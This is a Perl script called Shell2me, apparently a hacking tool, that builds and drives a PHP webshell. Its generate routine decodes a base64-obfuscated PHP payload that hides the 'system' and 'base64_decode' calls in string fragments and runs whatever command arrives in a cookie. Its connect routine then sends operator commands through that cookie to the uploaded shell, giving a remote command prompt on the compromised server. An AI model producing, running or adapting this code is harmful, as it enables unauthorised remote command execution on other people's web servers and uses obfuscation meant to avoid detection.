################# Shell2me v0.1 #########
##########################################
# Coded by J.M. Fernández (The X-C3LL)
# Blog: 0verl0ad.blogspot.com
# Twitter: @TheXC3LL
#########################################


use LWP::UserAgent;
use MIME::Base64;


&shell2me;

sub shell2me {
print q(
*-====[ Shell2me ]====-*

	1. Generate a Webshell
	2. Connect to a uploaded shell
	3. Exit

);

print "[!] Enter the option: ";
$option = <STDIN>;
chomp($option);

if ($option eq "1") {
	&generate;
} elsif ($option eq "2") {
	&conn;
	exit;	
}
}

sub generate {
	$shell = "PD9waHAgJGEgPSAic3lzIjskYiA9ICJ0ZW0iOyRjID0gJGEuJGI7JHkgPSAiYmFzZSI7JHggPSAiNjQiOyR3ID0gIl8iOyR2ID0gImRlY28iOyR1ID0gImRlIjskeiA9ICR5LiR4LiR3LiR2LiR1OyRkID0gJHooQCRfQ09PS0lFWydEaXJ0eVBvcm4nXSk7QCRjKCRkKTs/Pg==";
	$shell = decode_base64($shell);
	print "\n\n[?] Insert a name for the file: ";
	$name = <STDIN>;
	chomp($name);
	open(FILE, ">>", $name);
	print FILE $shell;
	close(FILE);
	print "\n[!] File containing the webshell was created!\n\n";
	&shell2me;
}


sub conn {
	print "\n[?] Enter URL where the WebShell is located:  ";
	$url = <STDIN>;
	chomp($url);
	$ua = LWP::UserAgent->new;
	$response = $ua->get($url);
	if ($response->status_line !~ /200/) {
		print "[!] Url Cound't be reached. It is wrong or the webshells was removed\n";
		&shell2me;
	} 
	print "\n[!] Connected! Write 'exit' to disconnect\n\n";
	while ($exe ne "exit") {
		print "(system)\$> ";
		$exe = <STDIN>;
		print "\n";
		chomp($exe);
		if ($exe eq "exit") { 
			print "[!] Disconnecting...\n\n";
			sleep(2);
			&shell2me;
		} else {
			$response = $ua->get($url, Cookie => "DirtyPorn=". encode_base64($exe));
			$html = $response->decoded_content;
			print "\n$html\n";

		}

	}
}
